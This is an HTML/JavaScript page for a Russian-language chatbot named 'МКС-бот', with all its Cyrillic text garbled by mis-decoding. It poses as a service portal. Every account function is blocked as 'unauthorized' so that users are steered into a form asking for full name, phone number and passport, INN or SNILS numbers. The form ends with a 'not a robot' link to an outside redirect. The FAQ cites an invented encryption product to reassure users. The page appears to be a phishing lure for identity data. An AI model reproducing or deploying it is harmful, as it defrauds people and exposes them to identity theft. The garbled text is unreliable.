<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>–ú–ö–°-–±–æ—Ç –≤–µ–±</title>
<style>
    body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
    #chat { max-width: 500px; margin: 20px auto; background: #fff; border-radius: 10px; padding: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .message { margin: 10px 0; }
    .bot { color: #000; }
    .user { color: #007bff; text-align: right; }
    button { padding: 10px 15px; margin: 5px; border: none; border-radius: 5px; cursor: pointer; }
    .menu-btn { background: #007bff; color: #fff; }
    .back-btn { background: #6c757d; color: #fff; }
    input { padding: 10px; margin: 5px 0; width: 100%; border-radius: 5px; border: 1px solid #ccc; }
</style>
</head>
<body>
<div id="chat">
    <div class="message bot">üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ú–ö–°-–±–æ—Ç! üì° –£–ø—Ä–∞–≤–ª—è–π—Ç–µ —Å–≤–æ–∏–º–∏ —É—Å–ª—É–≥–∞–º–∏ –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! üåê</div>
    <div id="buttons"></div>
</div>

<script>
const chat = document.getElementById('chat');
const buttonsDiv = document.getElementById('buttons');

const mainMenu = [
    { text: "üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", action: startForm },
    { text: "üîÑ –ü–æ–º–µ–Ω—è—Ç—å —Ç–∞—Ä–∏—Ñ", action: unauthorizedAction },
    { text: "üí≥ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å", action: unauthorizedAction },
    { text: "üí∏ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", action: unauthorizedAction },
    { text: "üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏", action: additionalServicesMenu }
];

const additionalMenu = [
    { text: "‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã", action: faqMenu },
    { text: "‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", action: instruction },
    { text: "üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π", action: contactSupport },
    { text: "‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥", action: showMainMenu }
];

const backButton = [{ text: "‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥", action: showMainMenu }];

let state = {};
let formData = {};

function addMessage(text, sender='bot') {
    const msg = document.createElement('div');
    msg.className = 'message ' + sender;
    msg.innerHTML = text;
    chat.appendChild(msg);
    chat.scrollTop = chat.scrollHeight;
}

function showButtons(menu) {
    buttonsDiv.innerHTML = '';
    menu.forEach(btn => {
        const button = document.createElement('button');
        button.textContent = btn.text;
        button.onclick = btn.action;
        button.className = btn.text.includes("‚Ü©Ô∏è") ? 'back-btn' : 'menu-btn';
        buttonsDiv.appendChild(button);
    });
}

function showMainMenu() {
    state = {};
    addMessage("üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ú–ö–°-–±–æ—Ç! üì° –£–ø—Ä–∞–≤–ª—è–π—Ç–µ —Å–≤–æ–∏–º–∏ —É—Å–ª—É–≥–∞–º–∏ –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! üåê");
    showButtons(mainMenu);
}

function unauthorizedAction() {
    addMessage("–ú—ã –Ω–µ –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª–∏—Å—å. ‚ö†Ô∏è");
    showButtons([{ text: "üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è", action: startForm }, { text: "‚Ü©Ô∏è –°–º–µ–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ", action: showMainMenu }]);
}

function additionalServicesMenu() {
    addMessage("üõ†Ô∏è –í—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é: üåê");
    showButtons(additionalMenu);
}

function faqMenu() {
    const faq = [
        { q: "‚è≥ –î–æ –∫–∞–∫–æ–≥–æ —á–∏—Å–ª–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è?", a: "üìå –ü–æ–∫–∞–∑–∞–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–æ–≤ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –¥–æ 25 —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞. üì°" },
        { q: "üí∏ –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤–æ–≤—Ä–µ–º—è?", a: "‚ö†Ô∏è –ü–ª–∞—Ç–∞ –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª–µ–Ω–∞ –ø–æ —Å—Ä–µ–¥–Ω–µ–º—É ‚Äî –∏—Å—Ö–æ–¥—è –∏–∑ –ø–æ–∫–∞–∑–∞–Ω–∏–π –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø–æ–ª–≥–æ–¥–∞. ‚ö°Ô∏è" },
        { q: "üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?", a: "üîí –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). üåê" },
        { q: "‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?", a: "‚ö°Ô∏è –î–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –ø–ª–æ—â–∞–¥–∫–∏. üì°" },
        { q: "üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?", a: "‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üåê" },
        { q: "üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?", a: "üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°. üì°" },
        { q: "‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥", action: showMainMenu }
    ];
    const menu = faq.map(f => ({ text: f.q, action: () => f.a ? addMessage(f.a) && showButtons(backButton) : f.action() }));
    addMessage("‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã: üåê");
    showButtons(menu);
}

function instruction() {
    const text = `üìã –ß—Ç–æ–±—ã –æ–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ:
1Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ ¬´–û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ¬ª.
2Ô∏è‚É£ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.
3Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.
4Ô∏è‚É£ –ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ. üåê

–ù–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–∂–∞—Ç—å '‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥'. üì°`;
    addMessage(text);
    showButtons(backButton);
}

function contactSupport() {
    addMessage('üìû –î–ª—è —Å–≤—è–∑–∏ —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É: <a href="https://t.me/MyMKCsup" target="_blank">–ù–∞–ø–∏—Å–∞—Ç—å –≤ —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫—É</a> üåê');
    showButtons(backButton);
}

// ===== –§–æ—Ä–º–∞ =====
function startForm() {
    state.step = 'fullname';
    addMessage("<b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b>");
    addMessage("üë§ –£–∫–∞–∂–∏—Ç–µ –§–∞–º–∏–ª–∏—é –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é (—Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç): üåê");
    showInput(handleFormInput);
}

function showInput(callback) {
    buttonsDiv.innerHTML = '<input type="text" id="inputField" placeholder="–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ..."><button onclick="submitInput()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>';
    window.submitInput = () => {
        const val = document.getElementById('inputField').value.trim();
        callback(val);
    };
}

function handleFormInput(val) {
    if (val === "‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥") return showMainMenu();

    switch(state.step) {
        case 'fullname':
            if(!/^[–ê-–Ø–∞-—è–Å—ë\s-]+$/.test(val)) { addMessage("‚ùå –§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. ‚ö†Ô∏è"); showInput(handleFormInput); return; }
            formData.fullname = val; state.step = 'phone';
            addMessage("<b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b>");
            addMessage("üìû –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞—á–Ω–∏—Ç–µ —Å +7 –∏–ª–∏ 7, –Ω–∞–ø—Ä–∏–º–µ—Ä: +79991234567): üì°");
            showInput(handleFormInput);
            break;
        case 'phone':
            if(!/^(\+7|7)[0-9]{10}$/.test(val.replace(/\D/g,''))) { addMessage("‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. ‚ö†Ô∏è"); showInput(handleFormInput); return; }
            formData.phone = val; state.step = 'document_type';
            addMessage("–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç: üåê");
            showButtons([
                { text: "üìÑ –ü–∞—Å–ø–æ—Ä—Ç", action: () => selectDocument("–ü–∞—Å–ø–æ—Ä—Ç") },
                { text: "üßæ –ò–ù–ù", action: () => selectDocument("–ò–ù–ù") },
                { text: "üü¢ –°–ù–ò–õ–°", action: () => selectDocument("–°–ù–ò–õ–°") },
                { text: "‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥", action: () => { state.step='phone'; handleFormInput('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥'); } }
            ]);
            break;
        case 'document_number':
            formData.document_number = val;
            addMessage(`‚ùóÔ∏è–ü–æ—Å–ª–µ–¥–Ω–∏–π —à–∞–≥‚ùóÔ∏è\n–î–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã —á–µ–ª–æ–≤–µ–∫, –Ω–∞–∂–∞–≤ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ. üëá`);
            addMessage('<a href="https://redirect.figma.site/" target="_blank">–Ø –Ω–µ —Ä–æ–±–æ—Ç ‚úÖ</a>');
            formData = {}; state = {};
            showButtons(mainMenu);
            break;
    }
}

function selectDocument(type) {
    formData.document_type = type;
    state.step = 'document_number';
    let placeholder = '';
    switch(type){
        case "–ü–∞—Å–ø–æ—Ä—Ç": placeholder = "–í–≤–µ–¥–∏—Ç–µ —Å–µ—Ä–∏—é –∏ –Ω–æ–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞ (–ø—Ä–∏–º–µ—Ä: 4510 123456)"; break;
        case "–ò–ù–ù": placeholder = "–í–≤–µ–¥–∏—Ç–µ –ò–ù–ù (–ø—Ä–∏–º–µ—Ä: 500100732259)"; break;
        case "–°–ù–ò–õ–°": placeholder = "–í–≤–µ–¥–∏—Ç–µ –°–ù–ò–õ–° (–ø—Ä–∏–º–µ—Ä: 112-233-445 95)"; break;
    }
    addMessage(`<b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b>`);
    addMessage(placeholder + ": üåê");
    showInput(handleFormInput);
}

// ===== –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è =====
showMainMenu();
</script>
</body>
</html>
